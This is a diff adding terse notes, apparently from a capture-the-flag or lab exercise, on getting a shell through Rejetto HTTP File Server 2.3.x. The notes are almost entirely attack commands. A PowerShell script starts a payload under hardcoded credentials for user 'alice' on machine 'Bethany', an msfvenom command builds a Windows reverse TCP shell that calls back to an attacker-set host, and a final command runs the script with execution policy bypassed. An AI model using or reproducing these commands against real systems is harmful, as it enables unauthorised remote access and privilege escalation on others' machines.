@@ -1,0 +1,20 @@
+Rejetto HTTP File Server (HFS) 2.3.x - modify script and execute - we have shell
+
+
+create root.ps1:
+
+
+$secpasswd = ConvertTo-SecureString "aliceishere" -AsPlainText -Force
+
+$mycreds = New-Object System.Management.Automation.PSCredential ("alice", $secpasswd)
+
+$computer = "Bethany"
+
+[System.Diagnostics.Process]::Start("C:\Users\Public\rev.exe", "", $mycreds.Username, $mycreds.Password, $computer)
+
+
+
+msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > rev.exe
+
+
+powershell -ExecutionPolicy Bypass -File c:\users\public\root.ps1
